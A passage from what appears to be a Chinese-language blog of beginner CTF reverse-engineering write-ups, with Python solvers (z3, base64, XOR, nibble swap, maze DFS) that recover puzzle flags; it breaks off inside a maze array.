href="#gdouctf-2023check_your_luckz3"></a> [GDOUCTF 2023]Check_Your_Luck(z3)</h2><h3 id="题目描述-18"><a class="markdownIt-Anchor" href="#题目描述-18"></a> 题目描述</h3><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">#include &lt;iostream&gt;using namespace std;void flag_checker(int v, int w,int x,int y,int z); int main()&#123;int v,w,x,y,z;cout &lt;&lt; &quot;Input 5 random number and check your luck ;)&quot; &lt;&lt; endl;cout &lt;&lt; &quot;Num1: &quot;;cin &gt;&gt; v;cout &lt;&lt; &quot;Num2: &quot;;cin &gt;&gt; w;cout &lt;&lt; &quot;Num3: &quot;;cin &gt;&gt; x;cout &lt;&lt; &quot;Num4: &quot;;cin &gt;&gt; y;cout &lt;&lt; &quot;Num5: &quot;;cin &gt;&gt; z;cout &lt;&lt; endl;flag_checker(v,w,x,y,z);&#125;void flag_checker(int v,int w, int x, int y, int z)&#123;if ((v * 23 + w * -32 + x * 98 + y * 55 + z * 90 &#x3D;&#x3D; 333322) &amp;&amp;(v * 123 + w * -322 + x * 68 + y * 67 + z * 32 &#x3D;&#x3D; 707724) &amp;&amp;(v * 266 + w * -34 + x * 43 + y * 8 + z * 32 &#x3D;&#x3D; 1272529) &amp;&amp;(v * 343 + w * -352 + x * 58 + y * 65 + z * 5 &#x3D;&#x3D; 1672457) &amp;&amp;(v * 231 + w * -321 + x * 938 + y * 555 + z * 970 &#x3D;&#x3D; 3372367))&#123;cout &lt;&lt; &quot;Congratulations, Here is your flag:\n&quot;;cout &lt;&lt; &quot;flag&#123;&quot; &lt;&lt; v &lt;&lt; &quot;_&quot; &lt;&lt; w &lt;&lt; &quot;_&quot; &lt;&lt; x &lt;&lt; &quot;_&quot; &lt;&lt; y &lt;&lt; &quot;_&quot; &lt;&lt; z &lt;&lt; &quot;&#125;&quot; &lt;&lt; endl;&#125;else&#123;cout &lt;&lt; &quot;\nSeems your luck is not in favor right now!\nBetter luck next time!&quot; &lt;&lt; endl;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然是这是五元一次方程，高斯消元可以求解，这里为了方便直接z3一把梭</p><h3 id="exp-18"><a class="markdownIt-Anchor" href="#exp-18"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>v<span class="token punctuation">,</span>w<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token operator">=</span>Ints<span class="token punctuation">(</span><span class="token string">'v w x y z'</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">23</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">32</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">98</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">55</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">90</span> <span class="token operator">==</span> <span class="token number">333322</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">123</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">322</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">68</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">67</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">707724</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">266</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">34</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">43</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">1272529</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">343</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">352</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">65</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">1672457</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v <span class="token operator">*</span> <span class="token number">231</span> <span class="token operator">+</span> w <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">321</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token number">938</span> <span class="token operator">+</span> y <span class="token operator">*</span> <span class="token number">555</span> <span class="token operator">+</span> z <span class="token operator">*</span> <span class="token number">970</span> <span class="token operator">==</span> <span class="token number">3372367</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#[x = 677, w = 123, z = 777, v = 4544, y = 1754]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1贝斯是什么乐器啊"><a class="markdownIt-Anchor" href="#hnctf-2022-week1贝斯是什么乐器啊"></a> [HNCTF 2022 Week1]贝斯是什么乐器啊？</h2><h3 id="题目描述-19"><a class="markdownIt-Anchor" href="#题目描述-19"></a> 题目描述</h3><p>base64后，加改减就可以</p><h3 id="exp-19"><a class="markdownIt-Anchor" href="#exp-19"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64enc<span class="token operator">=</span><span class="token string">"TlJRQFBBdTs4alsrKFI6MjgwNi5p"</span>enc_<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc_<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>enc_<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#b'NRQ@PAu;8j[+(R:2806.i'</span><span class="token comment">#NSSCTF&#123;B@se64_HAHAHA&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hnctf-2022-week1x0r"><a class="markdownIt-Anchor" href="#hnctf-2022-week1x0r"></a> [HNCTF 2022 Week1]X0r</h2><h3 id="题目描述-20"><a class="markdownIt-Anchor" href="#题目描述-20"></a> 题目描述</h3><p>简单的异或</p><h3 id="exp-20"><a class="markdownIt-Anchor" href="#exp-20"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1022</span><span class="token punctuation">,</span>  <span class="token number">1003</span><span class="token punctuation">,</span>  <span class="token number">1003</span><span class="token punctuation">,</span>  <span class="token number">1019</span><span class="token punctuation">,</span>  <span class="token number">996</span><span class="token punctuation">,</span>  <span class="token number">1014</span><span class="token punctuation">,</span>  <span class="token number">979</span><span class="token punctuation">,</span>  <span class="token number">976</span><span class="token punctuation">,</span>  <span class="token number">904</span><span class="token punctuation">,</span>  <span class="token number">970</span><span class="token punctuation">,</span>  <span class="token number">1007</span><span class="token punctuation">,</span>  <span class="token number">905</span><span class="token punctuation">,</span>  <span class="token number">971</span><span class="token punctuation">,</span>  <span class="token number">1007</span><span class="token punctuation">,</span>  <span class="token number">971</span><span class="token punctuation">,</span>  <span class="token number">904</span><span class="token punctuation">,</span>  <span class="token number">1007</span><span class="token punctuation">,</span>  <span class="token number">981</span><span class="token punctuation">,</span>  <span class="token number">985</span><span class="token punctuation">,</span>  <span class="token number">971</span><span class="token punctuation">,</span>  <span class="token number">977</span><span class="token punctuation">,</span>  <span class="token number">973</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">900</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x34</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>char<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#NSSCTF&#123;x0r_1s_s0_easy&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bjdctf-2020easy"><a class="markdownIt-Anchor" href="#bjdctf-2020easy"></a> [BJDCTF 2020]Easy</h2><h3 id="题目描述-21"><a class="markdownIt-Anchor" href="#题目描述-21"></a> 题目描述</h3><p>ida pro动态调试，发现_ques函数是输出flag的函数，劫持输出流，设置eip到该函数的入口，直接F9</p><p>看命令行界面（要熟练使用ida调试的快捷键）</p><h3 id="exp-21"><a class="markdownIt-Anchor" href="#exp-21"></a> exp</h3><p>150689</p><p>HACKIT4FUN</p><h2 id="hgame-2022-week1easyasm"><a class="markdownIt-Anchor" href="#hgame-2022-week1easyasm"></a> [HGAME 2022 week1]easyasm</h2><h3 id="题目描述-22"><a class="markdownIt-Anchor" href="#题目描述-22"></a> 题目描述</h3><ul><li>解题大致思路<br />16位DOS，只能看汇编<br />150824<br />开头载入了两个数据dseg、seg001<br />往上翻可以找到<br />一个是提示字符<br />150935<br />一个是密文<br />151011<br />分析一下加密过程<br />151090<br />把每个数前四位和后四位交换，再与23异或<br />构建解密脚本（注意还原后的结果%256，不然打不出来正确的结果）</li></ul><h3 id="exp-22"><a class="markdownIt-Anchor" href="#exp-22"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#每个字节的前四位和后四位交换，再与23异或</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>Array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">145</span><span class="token punctuation">,</span>  <span class="token number">97</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span>  <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span>  <span class="token number">33</span><span class="token punctuation">,</span>    <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span>  <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">84</span><span class="token punctuation">,</span>  <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span>   <span class="token number">226</span><span class="token punctuation">,</span>  <span class="token number">96</span><span class="token punctuation">,</span>  <span class="token number">20</span><span class="token punctuation">,</span>  <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span>  <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span>  <span class="token number">23</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">b''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> Array<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'hgame&#123;welc0me_to_4sm_w0rld&#125;\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hubuctf-2022-新生赛help"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛help"></a> [HUBUCTF 2022 新生赛]help</h2><h3 id="题目描述-23"><a class="markdownIt-Anchor" href="#题目描述-23"></a> 题目描述</h3><p>发现有个CreateMap()函数，在它后面的跳转点打个断点，动态调试<br />155811<br />155877<br />进入CreateMap()按F5找map<br />155964</p><p>在Export data 中提取出来，编辑成16个一行</p><pre class="line-numbers language-none"><code class="language-none是起点  wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>157075<br />在check()函数可以发现步法，以及初始位置(1,15)<br />那么接下来就只需要找路了<br />找到之后转md5</p><h3 id="exp迷宫万用脚本dfs"><a class="markdownIt-Anchor" href="#exp迷宫万用脚本dfs"></a> exp(迷宫万用脚本dfs)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#可视化</span>dirs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#当前位置四个方向的偏移量</span>path<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>              <span class="token comment">#存找到的路径</span> <span class="token keyword">def</span> <span class="token function">mark</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#给迷宫maze的位置pos标"2"表示“倒过了”</span>    maze<span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">def</span> <span class="token function">passable</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">:</span>    rows<span class="token punctuation">,</span> cols <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> rows <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> cols <span class="token keyword">and</span> maze<span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">def</span> <span class="token function">find_path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>pos<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>    mark<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>pos<span class="token punctuation">)</span>    <span class="token keyword">if</span> pos<span class="token operator">==</span>end<span class="token punctuation">:</span>        <span class="token comment"># print(pos,end=" ")  #已到达出口，输出这个位置。成功结束</span>        path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pos<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment">#否则按四个方向顺序检查</span>        nextp<span class="token operator">=</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>dirs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dirs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment">#考虑下一个可能方向</span>        <span class="token keyword">if</span> passable<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>nextp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#不可行的相邻位置不管</span>            <span class="token keyword">if</span> find_path<span class="token punctuation">(</span>maze<span class="token punctuation">,</span>nextp<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#如果从nextp可达出口，输出这个位置，成功结束</span>                <span class="token comment"># print(pos,end="")</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pos<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token keyword">def</span> <span class="token function">see_path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token comment">#使寻找到的路径可视化</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        current_pos <span class="token operator">=</span> path<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>        next_pos <span class="token operator">=</span> path<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        direction <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">if</span> current_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> next_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"w"</span>  <span class="token comment"># 向下走</span>        <span class="token keyword">elif</span> current_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> next_pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"s"</span>  <span class="token comment"># 向上走</span>        <span class="token keyword">elif</span> current_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> next_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"a"</span>  <span class="token comment"># 向右走</span>        <span class="token keyword">elif</span> current_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> next_pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            direction <span class="token operator">=</span> <span class="token string">"d"</span>  <span class="token comment"># 向左走</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>direction<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span>p <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            maze<span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"E"</span>        <span class="token keyword">elif</span> i<span class="token operator">==</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            maze<span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"S"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            maze<span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token number">3</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> r <span class="token keyword">in</span> maze<span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> r<span class="token punctuation">:</span>            <span class="token keyword">if</span> c<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;31m'</span><span class="token operator">+</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> c<span class="token operator">==</span><span class="token string">"S"</span> <span class="token keyword">or</span> c<span class="token operator">==</span><span class="token string">"E"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;34m'</span><span class="token operator">+</span>c<span class="token operator">+</span><span class="token string">" "</span> <span class="token operator">+</span> <span class="token string">'\033[0m'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> c<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;32m'</span><span class="token operator">+</span><span class="token string">"#"</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> c<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;;40m'</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">'\033[0m'</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    maze <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>\    <span class="token punctuation">[</span><span class="token number">1</span><span class="token 